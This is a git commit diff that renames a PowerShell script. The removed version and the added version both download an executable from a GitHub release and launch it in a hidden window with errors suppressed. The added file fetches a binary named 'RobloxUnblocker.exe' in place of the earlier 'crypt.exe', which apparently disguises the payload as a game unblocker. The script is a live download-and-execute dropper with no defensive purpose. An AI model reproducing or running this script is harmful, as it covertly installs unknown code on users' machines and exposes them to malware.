93a36bf49f85b4c4a1f4f8ba5f0a9071cc5c7d3d
kilordow <petrovolosuk310@gmail.com>
2026-02-21 23:04:51 +0200

    Update and rename nerest.ps1 to nerestt.ps1

--- nerest.ps1
+++
@@ -1,7 +0,0 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/crypt.exe" -OutFile "crypt.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "crypt.exe" -WindowStyle Hidden
-
-
-
---
+++ nerestt.ps1
@@ -0,0 +1,8 @@
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/RobloxUnblocker.exe" -OutFile "RobloxUnblocker.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "RobloxUnblocker.exe" -WindowStyle Hidden
+
+
+
+
